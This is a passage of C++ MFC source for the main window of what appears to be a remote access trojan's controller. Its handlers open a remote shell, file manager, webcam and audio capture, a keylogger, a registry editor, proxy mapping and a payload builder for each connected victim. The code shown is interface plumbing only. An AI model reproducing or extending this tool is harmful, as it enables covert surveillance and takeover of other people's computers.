	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenChatDialog(WPARAM wParam, LPARAM lParam) // 剪切板
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CMydat	*dlg = new CMydat(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = GETDAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_FILEMANAGER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_SERVICE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVICE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return 0;
	
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	
	int nCount = pView->m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
		{
			CString str, strTemp;
			
			str = pView->m_pListCtrl->GetItemText(i,4);
			int n = str.Find("*");
			if (n == 0)
			{
				str = str.Right(str.GetLength() - 1);
			}
			strTemp = "*";
			strTemp += str;
			
			pView->m_pListCtrl->SetItemText(i,4,strTemp);
			
			break;
		}
	}
	
	return 0;
}




CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//做个标记
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	

	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}



LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);
/*
	CInputDialog Indlg;
	Indlg.Init("请输入聊天昵称", _T("点取消默认昵称为Hacker:"), this);
	if (Indlg.DoModal() != IDOK)   
		dlg->strName = "Hacker:\r\n"; 
	else
		dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0)); */
 
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_TEXTCHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //注册表
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
    dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenBuildDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	CBuildDlg dlg;
	
	dlg.bIsDllinfo = TRUE;
	dlg.m_pContext = pContext;
	dlg.m_iocpServer = m_iocpServer;
	
	LPBYTE lpBuffer = (LPBYTE)(pContext->m_DeCompressionBuffer.GetBuffer(1));
    memcpy(&dlg.m_dll_info, lpBuffer , sizeof(DLL_INFO));
	
	dlg.DoModal();
	
	return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PROXYMAP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	switch(nIDEvent)
	{
	case 0:
		{
			CString str;
			str.Format("发送: %.2f kb/s 接收: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 804, (float)m_iocpServer->m_nRecvKbps / 804);
			m_wndStatusBar.SetPaneText(1, str);
			m_iocpServer->m_nSendKbps = 0;
			m_iocpServer->m_nRecvKbps = 0;
		}
		break;
	default:
		break;
	}
	
	CXTPFrameWnd::OnTimer(nIDEvent);
}

LRESULT CMainFrame::OnOpenTempSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	pInfoMation->ShowSysinfoList(pContext);
	
	return 0;
}


LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
		  if (wParam == XTP_DPN_SHOWWINDOW)
		  {
			  // get a pointer to the docking pane being shown.
			  CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
			  if (!pPane->IsValid())
			  {
				  CWnd* pWnd = NULL;
				  if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
				  {
					  pPane->Attach(pWnd);
				  }
			  }
			  
			  return TRUE; // handled
		  }
		  return FALSE;
}